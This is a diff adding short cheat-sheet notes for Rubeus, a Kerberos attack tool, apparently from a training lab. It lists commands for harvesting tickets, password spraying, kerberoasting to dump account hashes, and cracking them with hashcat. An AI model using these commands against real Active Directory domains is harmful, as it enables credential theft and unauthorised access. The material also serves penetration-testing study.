@@ -1,0 +1,23 @@
+Rubeus - Tool for attacking Kerberos
+Source: https://github.com/GhostPack/Rubeus
+
+Harvesting Tickets:
+  Rubeus.exe harvest /interval:30
+                        Tells Rubeus to harvest for TGTs every 30 seconds
+
+Brute-Forcing & Password-Spraying:
+  echo 10.10.165.34 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+                        Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file
+  Rubeus.exe brute /password:Password1 /noticket
+                        
+Kerberoasting:
+  Rubeus.exe kerberoast
+                        Dump the Kerberos hash of any kerberoastable users
+  hashcat -m 13100 -a 0 hash.txt Pass.txt
+                        Crack that hash
+
+Options:
+
+Informational:
+  Be mindful of how you use this attack as it may lock you out of the network
+  depending on the account lockout policies
